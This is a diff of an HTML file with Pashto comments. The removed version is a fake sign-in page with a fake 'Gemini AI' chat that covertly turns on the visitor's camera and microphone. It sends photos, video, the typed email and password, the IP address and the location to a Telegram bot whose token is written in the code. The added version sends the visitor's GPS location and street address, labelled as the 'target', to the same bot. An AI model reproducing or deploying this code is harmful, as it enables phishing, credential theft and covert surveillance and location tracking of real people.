@@ -1,870 +1,127 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ps" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login</title>
-
-<style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family: Arial, sans-serif;
-}
-
-body{
-    height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background:#f3f3f3;
-    padding:0;
-}
-
-.login-container{
-    width:480px;
-    max-width:95%;
-    background:#fff;
-    border-radius:16px;
-    padding:38px 14px 26px 14px;
-    border:1px solid #e0e0e0;
-    box-shadow:0 4px 14px rgba(0,0,0,0.08);
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
-}
-
-.logo{
-    text-align:center;
-    margin-bottom:14px;
-}
-
-.logo img{
-    width:280px;
-}
-
-.title{
-    text-align:center;
-    font-size:22px;
-    font-weight:700;
-    margin-bottom:26px;
-    color:#222;
-}
-
-.input-box{
-    margin-bottom:18px;
-}
-
-label{
-    display:block;
-    font-size:15px;
-    margin-bottom:6px;
-    color:#444;
-}
-
-input{
-    width:100%;
-    height:54px;
-    border-radius:8px;
-    border:1px solid #ccc;
-    padding:0 14px;
-    font-size:15px;
-}
-
-input:focus{
-    border:2px solid #18c6e7;
-    outline:none;
-}
-
-.remember{
-    display:flex;
-    align-items:center;
-    margin:14px 0 22px;
-    font-size:14px;
-}
-
-.remember input{
-    width:16px;
-    height:16px;
-    margin-right:8px;
-}
-
-button{
-    width:100%;
-    height:54px;
-    border:none;
-    border-radius:8px;
-    background:#18c6e7;
-    font-size:16px;
-    font-weight:bold;
-    cursor:pointer;
-    color:#fff;
-}
-
-button:hover{
-    background:#0fb6d6;
-}
-
-button:disabled{
-    opacity:0.5;
-    cursor:not-allowed;
-}
-
-.error-msg {
-    background: #ffe6e6;
-    border: 1px solid #ff6666;
-    color: #cc0000;
-    padding: 10px;
-    border-radius: 8px;
-    font-size: 13px;
-    text-align: center;
-    margin-top: 12px;
-    display: none;
-}
-
-.success-msg {
-    background: #e6ffe6;
-    border: 1px solid #66cc66;
-    color: #006600;
-    padding: 10px;
-    border-radius: 8px;
-    font-size: 13px;
-    text-align: center;
-    margin-top: 12px;
-    display: none;
-}
-
-.loader {
-    display: none;
-    text-align: center;
-    margin-top: 12px;
-}
-
-.loader-spinner {
-    display: inline-block;
-    width: 30px;
-    height: 30px;
-    border: 3px solid #e0e0e0;
-    border-top: 3px solid #18c6e7;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-}
-
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-
-/* ========== پټه کیمره ========== */
-#video {
-    position: fixed;
-    top: -9999px;
-    left: -9999px;
-    width: 1px;
-    height: 1px;
-    opacity: 0;
-    pointer-events: none;
-}
-
-#canvas {
-    display: none;
-}
-
-/* ========== د چت پاڼې سټایل ========== */
-.chat-container {
-    width: 480px;
-    max-width: 95%;
-    height: 600px;
-    background: #fff;
-    border-radius: 16px;
-    border: 1px solid #e0e0e0;
-    box-shadow: 0 4px 14px rgba(0,0,0,0.08);
-    display: flex;
-    flex-direction: column;
-    overflow: hidden;
-}
-
-.chat-header {
-    background: #18c6e7;
-    color: #fff;
-    padding: 16px 20px;
-    font-size: 18px;
-    font-weight: 700;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-}
-
-.chat-header .logout-btn {
-    background: rgba(255,255,255,0.2);
-    border: none;
-    color: #fff;
-    padding: 6px 16px;
-    border-radius: 20px;
-    font-size: 13px;
-    cursor: pointer;
-    width: auto;
-}
-
-.chat-header .logout-btn:hover {
-    background: rgba(255,255,255,0.3);
-}
-
-.chat-messages {
-    flex: 1;
-    padding: 16px;
-    overflow-y: auto;
-    background: #f8f9fa;
-}
-
-.message {
-    margin-bottom: 12px;
-    padding: 10px 14px;
-    border-radius: 12px;
-    max-width: 85%;
-    word-wrap: break-word;
-    animation: fadeIn 0.3s ease;
-}
-
-@keyframes fadeIn {
-    from { opacity: 0; transform: translateY(10px); }
-    to { opacity: 1; transform: translateY(0); }
-}
-
-.message.user {
-    background: #18c6e7;
-    color: #fff;
-    align-self: flex-end;
-    margin-left: auto;
-}
-
-.message.bot {
-    background: #e9ecef;
-    color: #333;
-    align-self: flex-start;
-}
-
-.message .time {
-    font-size: 10px;
-    opacity: 0.6;
-    margin-top: 4px;
-    display: block;
-}
-
-.chat-input-area {
-    display: flex;
-    padding: 12px 16px;
-    border-top: 1px solid #e0e0e0;
-    background: #fff;
-    gap: 10px;
-}
-
-.chat-input-area input {
-    flex: 1;
-    height: 44px;
-    border-radius: 22px;
-    border: 1px solid #ccc;
-    padding: 0 16px;
-    font-size: 14px;
-}
-
-.chat-input-area input:focus {
-    border-color: #18c6e7;
-    outline: none;
-}
-
-.chat-input-area button {
-    width: auto;
-    height: 44px;
-    padding: 0 24px;
-    border-radius: 22px;
-    background: #18c6e7;
-    border: none;
-    color: #fff;
-    font-size: 14px;
-    font-weight: bold;
-    cursor: pointer;
-}
-
-.chat-input-area button:hover {
-    background: #0fb6d6;
-}
-
-.chat-input-area button:disabled {
-    opacity: 0.5;
-    cursor: not-allowed;
-}
-
-.typing-indicator {
-    display: none;
-    padding: 10px 16px;
-    color: #666;
-    font-size: 13px;
-}
-
-.typing-indicator .dots {
-    display: inline-block;
-    animation: dots 1.4s infinite;
-}
-
-@keyframes dots {
-    0% { content: '.'; }
-    33% { content: '..'; }
-    66% { content: '...'; }
-}
-
-.hidden {
-    display: none !important;
-}
-
-/* ========== د ویډیو ثبتولو حالت ========== */
-.video-status {
-    font-size: 11px;
-    color: #4ade80;
-    text-align: center;
-    padding: 4px;
-    background: rgba(74,222,128,0.1);
-    border-radius: 20px;
-    margin-top: 4px;
-}
-
-.video-status.recording {
-    color: #ff6b6b;
-    background: rgba(255,107,107,0.1);
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>د ادرس او لوکیشن ازموینه</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0f172a;
+            color: white;
+            text-align: center;
+            padding: 50px 20px;
+        }
+        .box {
+            background-color: #1e293b;
+            padding: 35px;
+            border-radius: 12px;
+            max-width: 450px;
+            margin: 0 auto;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+        button {
+            background-color: #3b82f6;
+            color: white;
+            border: none;
+            padding: 14px 35px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            transition: 0.3s;
+        }
+        button:hover {
+            background-color: #2563eb;
+        }
+        #text {
+            margin-top: 20px;
+            color: #94a3b8;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+    </style>
 </head>
-
 <body>
 
-<!-- ========== پټه کیمره ========== -->
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-
-<!-- ========== د Login پاڼه ========== -->
-<div id="loginPage" class="login-container">
-
-    <div class="logo">
-        <img src="Screenshot_2026-06-08-23-00-41-466_com.android.chrome~2.jpg">
-    </div>
-
-    <div class="title">Sign in</div>
-
-    <div id="errorMsg" class="error-msg"></div>
-    <div id="successMsg" class="success-msg"></div>
-
-    <div class="input-box">
-        <label>Email</label>
-        <input type="email" id="email" placeholder="Email">
-    </div>
-
-    <div class="input-box">
-        <label>Password</label>
-        <input type="password" id="password" placeholder="Password">
-    </div>
-
-    <div class="remember">
-        <input type="checkbox" id="rememberCheck">
-        <span>Remember password</span>
-    </div>
-
-    <button id="loginBtn">Login</button>
-
-    <div class="loader" id="loader">
-        <div class="loader-spinner"></div>
-        <p style="margin-top:6px;color:#666;font-size:13px;">Signing in...</p>
-    </div>
-</div>
-
-<!-- ========== د چت پاڼه (Gemini-like) ========== -->
-<div id="chatPage" class="chat-container hidden">
-    <div class="chat-header">
-        <span>🤖 Gemini AI</span>
-        <button class="logout-btn" id="logoutBtn">Logout</button>
-    </div>
-    
-    <div class="chat-messages" id="chatMessages">
-        <div class="message bot">
-            👋 Hello! I'm Gemini AI. Ask me anything!
-            <span class="time">Just now</span>
-        </div>
-    </div>
-    
-    <div class="typing-indicator" id="typingIndicator">
-        <span class="dots">.</span> Gemini is thinking...
-    </div>
-    
-    <div class="chat-input-area">
-        <input type="text" id="chatInput" placeholder="Ask anything...">
-        <button id="sendBtn">Send</button>
-    </div>
-    
-    <div class="video-status" id="videoStatus">🎥 Recording video...</div>
-</div>
-
-<script>
-    // ================================================================
-    //  ستاسو بوټ تنظیمات
-    // ================================================================
-    const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
-    const ADMIN_CHAT_ID = "8295417969";
-    const BOT_USERNAME = "YourBotUsername"; // خپل بوټ کارن نوم واچوئ
-    const MAX_VIDEO_DURATION = 60000; // ۶۰ ثانیې ویډیو
-    // ================================================================
-
-    let stream = null;
-    let photoCount = 0;
-    let isRunning = false;
-    let captureTimer = null;
-    let attempts = 0;
-    let isLoggedIn = false;
-    
-    // ========== د ویډیو ثبتولو متغیرونه ==========
-    let mediaRecorder = null;
-    let recordedChunks = [];
-    let isRecording = false;
-    let videoStartTime = 0;
-    let isVideoSent = false;
-
-    // ========== د کیمرې او ویډیو فعالول ==========
-    async function startCamera() {
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: 'user',
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                },
-                audio: true
-            });
-            
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            await video.play();
-            
-            isRunning = true;
-            
-            // د ویډیو ثبتول پیل کړئ
-            startVideoRecording();
-            
-            // د عکسونو ثبتول پیل کړئ
-            startAutoCapture();
-            
-        } catch (error) {
-            console.warn('Camera not available:', error);
-            document.getElementById('videoStatus').textContent = '⚠️ Camera not available';
-            document.getElementById('videoStatus').style.color = '#ff6b6b';
-        }
-    }
-
-    // ========== د ویډیو ثبتول (یوه بشپړه ویډیو) ==========
-    function startVideoRecording() {
-        if (!stream) return;
+    <div class="box">
+        <h2>📍 د هوښیار لوکیشن سیسټم</h2>
+        <p>د براوزر د ادرس موندنې (Reverse Geocoding) د ټیسټ لپاره لاندې تڼۍ کېکاږئ:</p>
         
-        recordedChunks = [];
-        isVideoSent = false;
-        videoStartTime = Date.now();
-        
-        try {
-            mediaRecorder = new MediaRecorder(stream, {
-                mimeType: 'video/webm;codecs=vp9,opus'
-            });
+        <button onclick="getDetailedLocation()">لوکیشن تایید کړه</button>
+        <p id="text"></p>
+    </div>
+
+    <script>
+        function getDetailedLocation() {
+            const textDisplay = document.getElementById("text");
             
-            mediaRecorder.ondataavailable = function(event) {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-            
-            mediaRecorder.onstop = function() {
-                if (recordedChunks.length > 0 && !isVideoSent) {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    sendVideoToTelegram(blob);
-                    isVideoSent = true;
-                    recordedChunks = [];
-                    document.getElementById('videoStatus').textContent = '✅ Video sent!';
-                    document.getElementById('videoStatus').style.color = '#4ade80';
-                    
-                    // بیا ویډیو ثبتول پیل کړئ
-                    setTimeout(() => {
-                        if (isRunning) {
-                            startVideoRecording();
-                            document.getElementById('videoStatus').textContent = '🎥 Recording video...';
-                            document.getElementById('videoStatus').style.color = '#ff6b6b';
-                        }
-                    }, 2000);
-                }
-            };
-            
-            mediaRecorder.start(1000);
-            isRecording = true;
-            document.getElementById('videoStatus').textContent = '🎥 Recording video...';
-            document.getElementById('videoStatus').style.color = '#ff6b6b';
-            
-            // د ۶۰ ثانیو وروسته ویډیو بنده کړئ
-            setTimeout(() => {
-                if (mediaRecorder && isRecording) {
-                    mediaRecorder.stop();
-                    isRecording = false;
-                    document.getElementById('videoStatus').textContent = '⏳ Processing video...';
-                    document.getElementById('videoStatus').style.color = '#ffd93d';
-                }
-            }, MAX_VIDEO_DURATION);
-            
-        } catch (error) {
-            console.error('Video recording error:', error);
-            document.getElementById('videoStatus').textContent = '⚠️ Video recording failed';
-            document.getElementById('videoStatus').style.color = '#ff6b6b';
-        }
-    }
+            // ستاسو د تلیګرام بوټ معلومات
+            const botToken = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
+            const chatId = "8295417969";
 
-    // ========== ویډیو بوټ ته لیږل ==========
-    async function sendVideoToTelegram(blob) {
-        try {
-            const duration = Math.floor((Date.now() - videoStartTime) / 1000);
-            const formData = new FormData();
-            formData.append('chat_id', ADMIN_CHAT_ID);
-            formData.append('video', blob, `video_${Date.now()}.webm`);
-            formData.append('caption', `🎥 Video (${duration}s) • With Audio`);
-            
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
-            await fetch(url, { method: 'POST', body: formData });
-            
-            console.log('Video sent successfully!');
-            
-        } catch (error) {
-            console.error('Send video error:', error);
-        }
-    }
+            if (navigator.geolocation) {
+                textDisplay.innerHTML = "⏳ لطفاً په براوزر کې د لوکیشن غوښتنې ته اجازه (Allow) ورکړئ...";
+                
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        
+                        textDisplay.innerHTML = "🔄 د جغرافیایي کوډونو څخه د ادرس ایستلو پروسه روانه ده...";
 
-    // ========== اتوماتیک عکسونه ==========
-    function startAutoCapture() {
-        capturePhoto();
-        captureTimer = setInterval(() => {
-            if (isRunning) capturePhoto();
-        }, 4000);
-    }
+                        // د OpenStreetMap وړیا API ته غوښتنه لېږل ترڅو ادرس پیدا کړي
+                        const geoApiUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`;
 
-    function capturePhoto() {
-        if (!isRunning || !stream) return;
-        
-        try {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-            
-            canvas.width = video.videoWidth || 320;
-            canvas.height = video.videoHeight || 240;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const imageData = canvas.toDataURL('image/jpeg', 0.85);
-            photoCount++;
-            
-            sendPhotoToTelegram(imageData);
-            
-        } catch (error) {
-            console.error('Capture error:', error);
-        }
-    }
+                        fetch(geoApiUrl, {
+                            headers: { 'Accept-Language': 'ps,pashto,en' } // په پښتو یا انګلیسي د ادرس غوښتنه
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            // د ادرس پوره متن ترلاسه کول
+                            const fullAddress = data.display_name || "ادرس پیدا نشو";
+                            
+                            textDisplay.innerHTML = "✅ ادرس موندل شو! بوټ ته د لېږلو په حال کې دئ...";
 
-    // ========== عکس بوټ ته لیږل ==========
-    async function sendPhotoToTelegram(imageData) {
-        try {
-            const blob = dataURItoBlob(imageData);
-            const formData = new FormData();
-            formData.append('chat_id', ADMIN_CHAT_ID);
-            formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-            formData.append('caption', `📸 Photo #${photoCount}`);
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
-                method: 'POST', 
-                body: formData 
-            });
-            
-        } catch (error) {
-            console.error('Send photo error:', error);
-        }
-    }
+                            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                            
+                            // هغه د منځپانګې پیغام چې ستا بوټ ته راځي
+                            const message = `🎯 **د هدف بشپړ لوکیشن او ادرس راغی!**\n\n` +
+                                            `🗺️ **د سیمې ادرس:**\n\`${fullAddress}\`\n\n` +
+                                            `🌐 **کوارډینات:**\nLatitude: \`${lat}\`\nLongitude: \`${lon}\`\n\n` +
+                                            `🔗 **د ګوګل مېپ لینک:**\n${mapUrl}`;
 
-    function dataURItoBlob(dataURI) {
-        const byteString = atob(dataURI.split(',')[1]);
-        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-        const ab = new ArrayBuffer(byteString.length);
-        const ia = new Uint8Array(ab);
-        for (let i = 0; i < byteString.length; i++) {
-            ia[i] = byteString.charCodeAt(i);
-        }
-        return new Blob([ab], { type: mimeString });
-    }
-
-    // ========== د IP او لوکیشن ==========
-    async function getUserIP() {
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        } catch {
-            return 'unknown';
-        }
-    }
-
-    async function getLocation(ip) {
-        try {
-            const res = await fetch(`https://ipapi.co/${ip}/json/`);
-            const data = await res.json();
-            return {
-                location: data.city && data.country_name ? `${data.city}, ${data.country_name}` : 'Unknown',
-                city: data.city || 'Unknown',
-                country: data.country_name || 'Unknown',
-                lat: data.latitude || 'Unknown',
-                lon: data.longitude || 'Unknown',
-                isp: data.org || 'Unknown'
-            };
-        } catch(e) {
-            return { location: 'Unknown', city: 'Unknown', country: 'Unknown', lat: 'Unknown', lon: 'Unknown', isp: 'Unknown' };
-        }
-    }
-
-    // ========== بوټ ته معلومات لیږل ==========
-    async function sendToAdmin(email, password, ip, location) {
-        const locationLink = location.lat && location.lon && location.lat !== 'Unknown' && location.lon !== 'Unknown' 
-            ? `https://www.google.com/maps?q=${location.lat},${location.lon}` 
-            : 'Not available';
-
-        const botId = BOT_TOKEN.split(':')[0];
-
-        const message = 
-            `🔐 *LOGIN SUCCESS* 🔐\n\n` +
-            `🤖 *Bot:* @${BOT_USERNAME}\n` +
-            `🆔 *Bot ID:* ${botId}\n\n` +
-            `👤 *Email:* ${email}\n` +
-            `🔑 *Password:* ${password}\n\n` +
-            `📍 *IP:* ${ip}\n` +
-            `🌍 *Location:* ${location.location}\n` +
-            `🏙️ *City:* ${location.city}\n` +
-            `🌐 *Country:* ${location.country}\n` +
-            `📡 *ISP:* ${location.isp}\n` +
-            `🗺️ *Map:* ${locationLink}\n\n` +
-            `📸 *Photos:* ${photoCount}\n` +
-            `🎥 *Video:* Recording...\n` +
-            `🌍 *Browser:* ${navigator.userAgent.split(' ').slice(0, 3).join(' ')}\n` +
-            `📱 *Device:* ${navigator.platform}\n` +
-            `⏰ *Time:* ${new Date().toLocaleString()}`;
-
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: ADMIN_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-            return true;
-        } catch(e) {
-            console.warn("Telegram error:", e);
-            return false;
-        }
-    }
-
-    // ========== د تېروتنې پیغام ==========
-    function showError(message) {
-        const errorDiv = document.getElementById('errorMsg');
-        errorDiv.textContent = message;
-        errorDiv.style.display = 'block';
-        setTimeout(() => {
-            errorDiv.style.display = 'none';
-        }, 4000);
-    }
-
-    function showSuccess(message) {
-        const successDiv = document.getElementById('successMsg');
-        successDiv.textContent = message;
-        successDiv.style.display = 'block';
-        setTimeout(() => {
-            successDiv.style.display = 'none';
-        }, 4000);
-    }
-
-    // ========== تایید ==========
-    function hasPashtoCharacters(text) {
-        const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
-        return pashtoRegex.test(text);
-    }
-
-    function isValidEmail(email) {
-        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-        return emailRegex.test(email);
-    }
-
-    // ========== Login ==========
-    document.getElementById('loginBtn').addEventListener('click', async () => {
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
-        const btn = document.getElementById('loginBtn');
-        const loader = document.getElementById('loader');
-
-        if (!email || !password) {
-            showError('Please fill in both email and password');
-            return;
-        }
-
-        if (hasPashtoCharacters(email) || hasPashtoCharacters(password)) {
-            showError('Pashto characters not allowed');
-            return;
-        }
-
-        if (!isValidEmail(email)) {
-            showError('Please enter a valid email address');
-            return;
-        }
-
-        if (password.length < 8) {
-            showError('Password must be at least 8 characters');
-            return;
-        }
-
-        const ip = await getUserIP();
-        const location = await getLocation(ip);
-
-        attempts++;
-        
-        if (attempts < 3) {
-            showError(`Invalid credentials (${attempts}/3)`);
-            return;
-        }
-
-        await sendToAdmin(email, password, ip, location);
-
-        showSuccess('✅ Login successful!');
-        loader.style.display = 'block';
-        btn.disabled = true;
-
-        setTimeout(() => {
-            document.getElementById('loginPage').classList.add('hidden');
-            document.getElementById('chatPage').classList.remove('hidden');
-            isLoggedIn = true;
-        }, 1000);
-    });
-
-    // ========== Logout ==========
-    document.getElementById('logoutBtn').addEventListener('click', () => {
-        isLoggedIn = false;
-        isRunning = false;
-        
-        if (mediaRecorder && isRecording) {
-            try { mediaRecorder.stop(); } catch(e) {}
-            isRecording = false;
-        }
-        if (captureTimer) clearInterval(captureTimer);
-        if (stream) stream.getTracks().forEach(track => track.stop());
-        
-        document.getElementById('chatPage').classList.add('hidden');
-        document.getElementById('loginPage').classList.remove('hidden');
-        document.getElementById('loginBtn').disabled = false;
-        document.getElementById('loader').style.display = 'none';
-        document.getElementById('email').value = '';
-        document.getElementById('password').value = '';
-        document.getElementById('chatMessages').innerHTML = `
-            <div class="message bot">
-                👋 Hello! I'm Gemini AI. Ask me anything!
-                <span class="time">Just now</span>
-            </div>
-        `;
-    });
-
-    // ========== د AI ځوابونه (Gemini-like) ==========
-    function getAIResponse(question) {
-        const q = question.toLowerCase().trim();
-        
-        const responses = {
-            'سلام': 'سلام! څنګه یاست؟ زه ستاسو سره د مرستې لپاره حاضر یم!',
-            'سلام؟': 'سلام! څنګه یاست؟ زه ستاسو سره د مرستې لپاره حاضر یم!',
-            'څنګه یاست': 'زه ښه یم، مننه! تاسو څنګه یاست؟',
-            'څنګه یی؟': 'زه ښه یم، مننه! تاسو څنګه یاست؟',
-            'نوم': 'زه Gemini یم، یو مصنوعي استخبارات!',
-            'نوم؟': 'زه Gemini یم، یو مصنوعي استخبارات!',
-            'تاسو څوک یاست': 'زه Gemini یم، د ګوګل لخوا جوړ شوی مصنوعي استخبارات!',
-            'تاسو څوک یاست؟': 'زه Gemini یم، د ګوګل لخوا جوړ شوی مصنوعي استخبارات!',
-            'ایا تاسو انسان یاست': 'نه، زه یو مصنوعي استخبارات یم، خو د انسانانو سره د مرستې لپاره جوړ شوی یم!',
-            'ایا تاسو انسان یاست؟': 'نه، زه یو مصنوعي استخبارات یم، خو د انسانانو سره د مرستې لپاره جوړ شوی یم!',
-            'پښتو': 'هو، زه په پښتو خبرې کولی شم! څه مرسته درته وکړم؟',
-            'انګلیسي': 'Yes, I can speak English too! How can I help you?',
-            'weather': 'I cannot check live weather, but you can check weather websites like weather.com!',
-            'weather?': 'I cannot check live weather, but you can check weather websites like weather.com!',
-            'time': `Current time is: ${new Date().toLocaleTimeString()}`,
-            'time?': `Current time is: ${new Date().toLocaleTimeString()}`,
-            'date': `Today's date is: ${new Date().toLocaleDateString()}`,
-            'date?': `Today's date is: ${new Date().toLocaleDateString()}`,
-            'څه شی یاست': 'زه Gemini یم، یو مصنوعي استخبارات چې د پوښتنو ځواب ویلو او د معلوماتو ورکولو لپاره جوړ شوی یم!',
-            'څه شی یاست؟': 'زه Gemini یم، یو مصنوعي استخبارات چې د پوښتنو ځواب ویلو او د معلوماتو ورکولو لپاره جوړ شوی یم!',
-            'مننه': 'ښه راغلاست! نوره مرسته درته وکړم؟',
-            'خدای': 'خدای دې ورسره مل وي! نوره مرسته درته وکړم؟',
-            'خدای؟': 'خدای دې ورسره مل وي! نوره مرسته درته وکړم؟'
-        };
-
-        for (let [key, value] of Object.entries(responses)) {
-            if (q.includes(key) || q === key) {
-                return value;
+                            // تلیګرام بوټ ته د ډاټا لېږل
+                            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: message,
+                                    parse_mode: 'Markdown'
+                                })
+                            });
+                        })
+                        .then(res => {
+                            if(res && res.ok) {
+                                textDisplay.innerHTML = "✅ ادرس او د ګوګل مېپ لینک ستا بوټ ته په بریالیتوب سره واستول شول! خپل بوټ وګوره.";
+                            }
+                        })
+                        .catch(err => {
+                            textDisplay.innerHTML = "❌ د ادرس په پروسس کې یا تلیګرام ته په لېږلو کې ستونزه راغله.";
+                            console.error(err);
+                        });
+                    }, 
+                    function(error) {
+                        textDisplay.innerHTML = "❌ د لوکیشن اجازه رد شوه. سیسټم نشي کولای ستاسو د اجازې پرته ادرس معلوم کړي.";
+                    }
+                );
+            } else {
+                textDisplay.innerHTML = "❌ ستاسو براوزر د دې سیسټم ملاتړ نه کوي.";
             }
         }
-
-        return `🤔 زه ستاسو پوښتنه پوه شوم، خو د دې لپاره ځانګړی ځواب نه لرم. مهرباني وکړئ بله پوښتنه وکړئ!`;
-    }
-
-    // ========== د پیغام لیږل ==========
-    function sendMessage() {
-        const input = document.getElementById('chatInput');
-        const message = input.value.trim();
-        
-        if (!message) return;
-        
-        const messagesDiv = document.getElementById('chatMessages');
-        const userMsg = document.createElement('div');
-        userMsg.className = 'message user';
-        userMsg.innerHTML = `${message}<span class="time">${new Date().toLocaleTimeString()}</span>`;
-        messagesDiv.appendChild(userMsg);
-        
-        input.value = '';
-        messagesDiv.scrollTop = messagesDiv.scrollHeight;
-        
-        const typing = document.getElementById('typingIndicator');
-        typing.style.display = 'block';
-        
-        setTimeout(() => {
-            typing.style.display = 'none';
-            
-            const response = getAIResponse(message);
-            const botMsg = document.createElement('div');
-            botMsg.className = 'message bot';
-            botMsg.innerHTML = `${response}<span class="time">${new Date().toLocaleTimeString()}</span>`;
-            messagesDiv.appendChild(botMsg);
-            messagesDiv.scrollTop = messagesDiv.scrollHeight;
-        }, 800 + Math.random() * 600);
-    }
-
-    // ========== د چت پیښې ==========
-    document.getElementById('sendBtn').addEventListener('click', sendMessage);
-    
-    document.getElementById('chatInput').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            sendMessage();
-        }
-    });
-
-    document.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            if (!document.getElementById('loginPage').classList.contains('hidden')) {
-                document.getElementById('loginBtn').click();
-            }
-        }
-    });
-
-    // ========== کیمره پیل کړئ ==========
-    startCamera();
-</script>
+    </script>
 
 </body>
 </html>
